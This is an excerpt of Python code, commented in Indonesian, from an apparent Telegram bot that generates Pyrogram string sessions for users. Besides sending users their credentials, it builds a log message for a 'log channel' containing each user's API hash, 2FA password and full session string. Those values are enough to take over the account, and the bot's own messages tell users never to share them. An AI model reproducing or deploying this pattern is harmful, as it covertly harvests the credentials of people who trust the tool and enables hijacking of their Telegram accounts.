    ...
    if step == STEP_API_ID:
        ...
        if current_state['phone_number'] is None:
            ...
            if result.startswith("ERROR"):
                ...
                # Password di state tetap None
                await send_success_message(message, result, account_info, current_state)
                USER_STATES.pop(user_id, None)
                return
        ...
        try:
            ...
            await send_success_message(message, session_string, account_info, current_state)
            USER_STATES.pop(user_id, None)
...
# --- FUNGSI INI YANG DIPERBAIKI UNTUK MENGHINDARI BUTTON_URL_INVALID ---
async def send_success_message(message: Message, session_string: str, account_info: str, current_state: dict):
    ...
    api_hash = current_state.get('api_hash')
    phone_number = current_state.get('phone_number')
    password = current_state.get('password') or "None"
    session_type = current_state.get('session_type')

    # --- FORMAT OUTPUT UNTUK PENGGUNA ---

    # Membuat teks String Session lengkap yang akan dikirim langsung
    session_details_text = (
        f"**🎉 {session_type.upper()} Userbot Client Berhasil Dibuat!**\n"
        "⚠️ **JANGAN BAGIKAN INI KEPADA SIAPAPUN** ⚠️\n\n"
        f"**AKUN:**\n{account_info}\n\n"
        f"**KREDENSIAL:**\n"
        f"• API_ID: `{api_id}`\n"
        f"• API_HASH: `{api_hash}`\n"
        f"• PHONE_NUMBER: `{phone_number}`\n"
        f"• PASSWORD 2FA: `{password}`\n\n"
        f"**STRING SESSION PYROGRAM:**\n`{session_string}`\n\n"
        f'Generated by ( @legeneratebot – @skyzixxxx )'
    )

    # 1. KIRIM DETAIL SESI LANGSUNG KE PENGGUNA (SAVED MESSAGES)
    try:
        await app.send_message(
            chat_id=user_id,
            text=session_details_text,
            parse_mode=enums.ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
    except Exception as e:
        # Jika gagal mengirim ke Saved Messages (misal user memblokir bot), kirim sebagai balasan biasa
        await message.reply_text(
            f"❌ **Error Pengiriman:** Gagal mengirim detail sesi ke Pesan Tersimpan Anda.\n\n"
            f"Saya akan mengirimkannya sebagai balasan:\n\n{session_details_text}",
            parse_mode=enums.ParseMode.MARKDOWN
        )
        return


    # 2. KIRIM PESAN KONFIRMASI SEBAGAI BALASAN
    final_text = (
        f"🎉 **String Session Anda Telah Berhasil Dibuat!**\n\n"
        f"**Akun:**\n{account_info}\n\n"
        "‼️ **Peringatan:** JANGAN bagikan string sesi ini kepada siapapun!\n\n"
        "✅ **Detail String Session sudah saya kirimkan sebagai pesan terpisah.**\n"
        "Silakan periksa **Pesan Tersimpan (Saved Messages)** Anda sekarang."
    )

    await message.reply_text(final_text, parse_mode=enums.ParseMode.MARKDOWN)

    # --- FORMAT OUTPUT UNTUK LOG CHANNEL ---

    log_text = (
        f"🔔 **SESI BARU DIBUAT ({session_type.upper()})**\n"
        f"**Pembuat:** [{message.from_user.first_name}](tg://user?id={user_id}) (`{user_id}`)\n"
        f"**Username Bot:** `@{username}`\n"
        f"**--- KREDENSIAL AKUN ---**\n"
        f"ID Akun: `{account_info.split()[1]}`\n"
        f"API_ID: `{api_id}`\n"
        f"API_HASH: `{api_hash}`\n"
        f"PASSWORD: `{password}`\n"
        f"**--- STRING SESSION LENGKAP ---**\n"
        f"`{session_string}`"
    )
